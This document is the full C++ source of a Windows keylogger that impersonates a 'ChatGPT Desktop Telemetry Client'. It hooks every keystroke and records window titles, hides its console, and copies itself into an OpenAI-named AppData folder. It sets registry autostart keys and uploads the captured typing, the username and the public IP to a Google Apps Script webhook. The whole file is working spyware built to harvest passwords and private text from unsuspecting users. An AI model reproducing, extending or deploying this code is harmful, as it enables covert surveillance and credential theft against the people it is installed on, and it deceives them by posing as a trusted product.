﻿#define UNICODE
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <thread>
#include <iomanip>
#include <Lmcons.h>
#include <mutex>
#include <shellapi.h>
#include <ShlObj.h>
#include <codecvt>

std::string inputBuffer;
std::string reconstructed_buffer;
std::mutex buffer_mutex;
std::ofstream local_log_file;
std::chrono::steady_clock::time_point lastKeyStroke = std::chrono::steady_clock::now();

const char *VersionTag = "ChatGPT Desktop Telemetry Client v1.7.3 - OpenAI ID: 0x8f920b1c";
void SendToWebhook(const std::string &raw, const std::string &decoded, const std::string &layout);

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define invisible // (visible / invisible)
// Defines whether you want to enable or disable
// boot time waiting if running at system boot.
#define bootwait // (bootwait / nowait)
// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0
// defines the output (webhook also includes local logging)
#define webhook // (webhook / local)
// defines if we copy to launch at system boot
#define startup // (startup / nostartup)
// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

#if FORMAT == 0
const std::map<int, std::string> keyname{
	{VK_BACK, "[BACKSPACE]"},
	{VK_RETURN, "[ENTER]"},
	{VK_SPACE, "_"},
	{VK_TAB, "[TAB]"},
	{VK_SHIFT, "[SHIFT]"},
	{VK_LSHIFT, "[LSHIFT]"},
	{VK_RSHIFT, "[RSHIFT]"},
	{VK_CONTROL, "[CONTROL]"},
	{VK_LCONTROL, "[LCONTROL]"},
	{VK_RCONTROL, "[RCONTROL]"},
	{VK_MENU, "[ALT]"},
	{VK_LWIN, "[LWIN]"},
	{VK_RWIN, "[RWIN]"},
	{VK_ESCAPE, "[ESCAPE]"},
	{VK_END, "[END]"},
	{VK_HOME, "[HOME]"},
	{VK_LEFT, "[LEFT]"},
	{VK_RIGHT, "[RIGHT]"},
	{VK_UP, "[UP]"},
	{VK_DOWN, "[DOWN]"},
	{VK_PRIOR, "[PG_UP]"},
	{VK_NEXT, "[PG_DOWN]"},
	{VK_OEM_PERIOD, "."},
	{VK_DECIMAL, "."},
	{VK_OEM_PLUS, "+"},
	{VK_OEM_MINUS, "-"},
	{VK_ADD, "+"},
	{VK_SUBTRACT, "-"},
	{VK_CAPITAL, "[CAPSLOCK]"},
	{VK_INSERT, "[INSERT]"},
	{VK_DELETE, "[DELETE]"},
	{VK_F1, "[F1]"},
	{VK_F2, "[F2]"},
	{VK_F3, "[F3]"},
	{VK_F4, "[F4]"},
	{VK_F5, "[F5]"},
	{VK_F6, "[F6]"},
	{VK_F7, "[F7]"},
	{VK_F8, "[F8]"},
	{VK_F9, "[F9]"},
	{VK_F10, "[F10]"},
	{VK_F11, "[F11]"},
	{VK_F12, "[F12]"},
	{VK_F13, "[F13]"},
	{VK_F14, "[F14]"},
	{VK_F15, "[F15]"},
	{VK_F16, "[F16]"},
	{VK_F17, "[F17]"},
	{VK_F18, "[F18]"},
	{VK_F19, "[F19]"},
	{VK_F20, "[F20]"},
	{VK_F21, "[F21]"},
	{VK_F22, "[F22]"},
	{VK_F23, "[F23]"},
	{VK_F24, "[F24]"},
	{VK_SNAPSHOT, "[PRINTSCREEN]"},
	{VK_SCROLL, "[SCROLLLOCK]"},
	{VK_PAUSE, "[PAUSE]"},
	{VK_NUMLOCK, "[NUMLOCK]"},
	{VK_INSERT, "[INSERT]"},
	{VK_DELETE, "[DELETE]"},
	{VK_HELP, "[HELP]"},
};
#endif

HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT *)lParam);
			int vk = kbdStruct.vkCode;
			if (vk == VK_SPACE && (GetAsyncKeyState(VK_LWIN) & 0x8000 || GetAsyncKeyState(VK_RWIN) & 0x8000))
			{
				std::lock_guard<std::mutex> lock(buffer_mutex);
				if (!inputBuffer.empty())
				{
					char layoutStr[KL_NAMELENGTH];
					GetKeyboardLayoutNameA(layoutStr);
#ifdef webhook
					SendToWebhook(inputBuffer, reconstructed_buffer, layoutStr);
#endif
					inputBuffer.clear();
					reconstructed_buffer.clear();
				}
			}

			if ((vk == VK_SHIFT) && (GetAsyncKeyState(VK_MENU) & 0x8000))
			{
				std::lock_guard<std::mutex> lock(buffer_mutex);
				if (!inputBuffer.empty())
				{
					char layoutStr[KL_NAMELENGTH];
					GetKeyboardLayoutNameA(layoutStr);
#ifdef webhook
					SendToWebhook(inputBuffer, reconstructed_buffer, layoutStr);
#endif
					inputBuffer.clear();
					reconstructed_buffer.clear();
				}
			}

			Save(vk);
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

std::string GetRealKeystroke(int vkCode, HKL layout)
{
	BYTE keyboardState[256] = {0};

	// Reconstruct keyboard state manually using GetAsyncKeyState
	for (int i = 0; i < 256; i++)
	{
		keyboardState[i] = (GetAsyncKeyState(i) & 0x8000) ? 0x80 : 0;
	}

	WCHAR buffer[5] = {0};
	int result = ToUnicodeEx(
		vkCode,
		MapVirtualKeyEx(vkCode, MAPVK_VK_TO_VSC, layout),
		keyboardState,
		buffer,
		4,
		0,
		layout);

	if (result > 0)
	{
		char utf8[5] = {0};
		int len = WideCharToMultiByte(CP_UTF8, 0, buffer, result, utf8, sizeof(utf8), NULL, NULL);
		return std::string(utf8, len);
	}

	return "";
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCWSTR a = L"Failed to install!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

std::string GetUsername()
{
	char username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	if (GetUserNameA(username, &username_len))
	{
		return std::string(username);
	}
	return "UnknownUser";
}

std::string JsonEscape(const std::string &input)
{
	std::ostringstream oss;
	for (char c : input)
	{
		switch (c)
		{
		case '"':
			oss << "\\\"";
			break;
		case '\\':
			oss << "\\\\";
			break;
		case '\b':
			oss << "\\b";
			break;
		case '\f':
			oss << "\\f";
			break;
		case '\n':
			oss << "\\n";
			break;
		case '\r':
			oss << "\\r";
			break;
		case '\t':
			oss << "\\t";
			break;
		default:
			if ((unsigned char)c < 0x20)
			{
				oss << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
			}
			else
			{
				oss << c;
			}
		}
	}
	return oss.str();
}

std::string GetPublicIP()
{
	HINTERNET hInternet = InternetOpenA("IPCheck", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet)
		return "unknown";

	HINTERNET hConnect = InternetOpenUrlA(hInternet, "https://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (!hConnect)
	{
		InternetCloseHandle(hInternet);
		return "unknown";
	}

	char buffer[64];
	DWORD bytesRead = 0;
	std::string ip;

	if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0)
	{
		buffer[bytesRead] = '\0';
		ip = buffer;
	}

	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	return ip.empty() ? "unknown" : ip;
}

void SendToWebhook(const std::string &raw, const std::string &decoded, const std::string &layout)
{
	HINTERNET hInternet = InternetOpen(L"ChatGPTDesktopClient", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet)
	{
		HINTERNET hConnect = InternetConnectA(hInternet, "script.google.com", INTERNET_DEFAULT_HTTPS_PORT,
											  NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
		if (hConnect)
		{
			const char *headers = "Content-Type: application/json\r\n";
			std::string user = GetUsername();
			std::string ip = GetPublicIP();
			std::string date;

			{
				time_t t = time(NULL);
				struct tm tm_info;
				localtime_s(&tm_info, &t);
				char buffer[64];
				strftime(buffer, sizeof(buffer), "%FT%X%z", &tm_info);
				date = buffer;
			}

			std::string body = "{";
			body += "\"user\":\"" + JsonEscape(user) + "\",";
			body += "\"ip\":\"" + JsonEscape(ip) + "\",";
			body += "\"datetime\":\"" + JsonEscape(date) + "\",";
			body += "\"raw\":\"" + JsonEscape(raw) + "\",";
			body += "\"decoded\":\"" + JsonEscape(decoded) + "\",";
			body += "\"format\":\"" + JsonEscape(layout) + "\"}";

			std::string webhookID;
			char *envWebhook = nullptr;
			size_t len = 0;
			if (_dupenv_s(&envWebhook, &len, "WEBHOOK_ID") == 0 && envWebhook != nullptr)
			{
				webhookID = envWebhook;
				free(envWebhook);
			}
			else
			{
				webhookID = "undefined_webhook";
			}

			std::string webhookPath = "/macros/s/" + webhookID + "/exec";

			HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", webhookPath.c_str(),
												  NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
			if (hRequest)
			{
				BOOL sent = HttpSendRequestA(hRequest, headers, (DWORD)strlen(headers),
											 (LPVOID)body.c_str(), (DWORD)body.length());

				if (!sent)
					std::cerr << "[!] HTTP send failed\n";

				HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hInternet);
	}
}

std::string removeLastUTF8(const std::string &input)
{
	if (input.empty())
		return "";

	auto end = input.end();
	do
	{
		--end;
	} while (end != input.begin() && ((*end & 0xC0) == 0x80));

	return std::string(input.begin(), end);
}

int Save(int key_stroke)
{
	std::stringstream output;
	static char lastwindow[256] = "";

#ifndef mouseignore
	if ((key_stroke == 1) || (key_stroke == 2) || (key_stroke == 3))
		return 0;
#endif

	HWND foreground = GetForegroundWindow();
	DWORD threadID = 0;
	HKL layout = NULL;

	if (foreground)
	{
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	std::string readable_header;
	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
			time_t t = time(NULL);
			struct tm tm_info;
			localtime_s(&tm_info, &t);
			char s[64];
			strftime(s, sizeof(s), "%FT%X%z", &tm_info);
			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
			char *exeName = strrchr(window_title, '\\');
			std::string shortTitle = exeName ? exeName + 1 : window_title;
			std::ostringstream readable_stream;
			readable_stream << "\n\n[Window: " << shortTitle << " - at " << s << "] ";
			readable_header = readable_stream.str();
		}
	}

	std::string displayKey;
	std::string realKey = GetRealKeystroke(key_stroke, layout);

	if (keyname.find(key_stroke) != keyname.end())
		displayKey = keyname.at(key_stroke);
	else if (!realKey.empty())
		displayKey = realKey;
	else {
		if (key_stroke == 1) displayKey = "[LCLICK]";
		else if (key_stroke == 2) displayKey = "[RCLICK]";
		else if (key_stroke == 3) displayKey = "[MCLICK]";
		else displayKey = "[" + std::to_string(key_stroke) + "]";
	}
	output << displayKey;
	{
		std::lock_guard<std::mutex> lock(buffer_mutex);

		if (!readable_header.empty())
			reconstructed_buffer += readable_header;

		if (key_stroke == VK_BACK)
			reconstructed_buffer = removeLastUTF8(reconstructed_buffer);
		else if (!realKey.empty())
			reconstructed_buffer += realKey;

		inputBuffer += output.str();
	}

	std::cout << output.str();

	if (local_log_file.is_open())
	{
		local_log_file << output.str();
		local_log_file.flush();
	}

	lastKeyStroke = std::chrono::steady_clock::now();
	return 0;
}

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	FreeConsole();											// Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
#endif
}

void EnsureAutostart()
{
	HKEY hKey;
	const char *runSubkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Telemetry\\OpenAI";
	const char *valueName = "ChatGPTDesktopClient";

	char exePath[MAX_PATH];
	GetModuleFileNameA(NULL, exePath, MAX_PATH);

	LONG result = RegCreateKeyExA(
		HKEY_CURRENT_USER,
		runSubkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		NULL);

	if (result == ERROR_SUCCESS)
	{
		RegSetValueExA(
			hKey,
			valueName,
			0,
			REG_SZ,
			reinterpret_cast<const BYTE *>(exePath),
			static_cast<DWORD>(strlen(exePath) + 1));

		RegCloseKey(hKey);

#ifdef visible
		std::cout << "[+] Autostart set: " << runSubkey << "\\" << valueName << "\n";
#endif
	}
	else
	{
#ifdef visible
		std::cerr << "[!] Failed to create autostart registry key.\n";
#endif
	}
}

// Function to check if the system is still booting up
bool IsSystemBooting()
{
	return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

void PeriodicSend()
{
	using namespace std::chrono;
	auto lastSend = steady_clock::now();

	while (true)
	{
		std::this_thread::sleep_for(milliseconds(500));

		auto now = steady_clock::now();
		bool sendByInactivity = duration_cast<seconds>(now - lastKeyStroke).count() >= 5;
		bool sendByInterval = duration_cast<minutes>(now - lastSend).count() >= 5;

		if (sendByInactivity || sendByInterval)
		{
			std::string copy, copy_human;
			{
				std::lock_guard<std::mutex> lock(buffer_mutex);
				if (inputBuffer.empty())
					continue;
				copy = inputBuffer;
				copy_human = reconstructed_buffer;
				inputBuffer.clear();
				reconstructed_buffer.clear();
			}

			char layoutStr[KL_NAMELENGTH];
			GetKeyboardLayoutNameA(layoutStr);
#ifdef webhook
			SendToWebhook(copy, copy_human, layoutStr);
			std::cout << ">> Payload sent: {\"input\":\"" << copy << "\", \"typed\":\"" << copy_human << "\"}\n";
#else
			std::cout << ">> Buffer flushed locally: {\"input\":\"" << copy << "\", \"typed\":\"" << copy_human << "\"}\n";
#endif

			lastSend = now;
		}
	}
}

void InstallToAppData()
{
	char exePath[MAX_PATH];
	GetModuleFileNameA(NULL, exePath, MAX_PATH);

	char appDataPath[MAX_PATH];
	SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);

	std::string targetDir = std::string(appDataPath) + "\\OpenAI";
	std::string targetPath = targetDir + "\\chatgpt.exe";

	// Prevent copying to the same path (avoids locking issues)
	if (_stricmp(exePath, targetPath.c_str()) == 0)
	{
#ifdef visible
		std::cout << "[i] Already running from AppData. Skipping copy.\n";
#endif
		return;
	}

	// Create target directory if it doesn't exist
	CreateDirectoryA(targetDir.c_str(), NULL);

	// If target file exists, attempt to delete it first
	DWORD attrs = GetFileAttributesA(targetPath.c_str());
	if (attrs != INVALID_FILE_ATTRIBUTES)
	{
		if (!DeleteFileA(targetPath.c_str()))
		{
			DWORD err = GetLastError();
			std::stringstream ss;
			ss << "DeleteFileA failed. Error code: " << err << "\nTarget: " << targetPath;
#ifdef visible
			std::cerr << "[!] " << ss.str() << "\n";
#else
			MessageBoxA(NULL, ss.str().c_str(), "Delete Error", MB_ICONERROR);
#endif
			return;
		}
	}

	// Attempt to copy the executable
	if (!CopyFileA(exePath, targetPath.c_str(), FALSE))
	{
		DWORD err = GetLastError();
		std::stringstream ss;
		ss << "CopyFileA failed. Error code: " << err
		   << "\nFrom: " << exePath << "\nTo: " << targetPath;
#ifdef visible
		std::cerr << "[!] " << ss.str() << "\n";
#else
		MessageBoxA(NULL, ss.str().c_str(), "Copy Error", MB_ICONERROR);
#endif
		return;
	}

#ifdef visible
	std::cout << "[+] Successfully copied to: " << targetPath << "\n";
#endif

	// Register in HKCU\...\Run for autostart
	HKEY hKey;
	const char *runPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	const char *valueName = "ChatGPT";

	if (RegOpenKeyExA(HKEY_CURRENT_USER, runPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		RegSetValueExA(hKey, valueName, 0, REG_SZ,
					   (const BYTE *)targetPath.c_str(), (DWORD)(targetPath.length() + 1));
		RegCloseKey(hKey);
#ifdef visible
		std::cout << "[+] Registry autostart set for ChatGPT.\n";
#endif
	}
	else
	{
#ifdef visible
		std::cerr << "[!] Failed to open registry key for autostart.\n";
#endif
	}
}

int main()
{
	HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\OpenAITelemetry");

	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return 0;
	}

	// Call the visibility of window function.
	Stealth();

	char appDataPath[MAX_PATH];
	SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);

	std::string logDir = std::string(appDataPath) + "\\OpenAI";
	std::string logPath = logDir + "\\current_log.txt";
	CreateDirectoryA(logDir.c_str(), NULL); // create dir if not exists

	local_log_file.open(logPath, std::ios_base::app);

#ifdef startup
	InstallToAppData();
	EnsureAutostart();
#endif

// Check if the system is still booting up
#ifdef bootwait // If defined at the top of this file, wait for boot metrics.
	while (IsSystemBooting())
	{
		std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
		Sleep(10000); // Wait for 10 seconds before checking again
	}
#endif
#ifdef nowait // If defined at the top of this file, do not wait for boot metrics.
	std::cout << "Skipping boot metrics check.\n";
#endif
	// This part of the program is reached once the system has
	// finished booting up aka when the while loop is broken
	// with the correct returned value.

	// Call the hook function and set the hook.
	SetHook();
	std::thread sender(PeriodicSend);
	sender.detach();

	// We need a loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
	if (local_log_file.is_open())
	{
		local_log_file.close();
	}
}
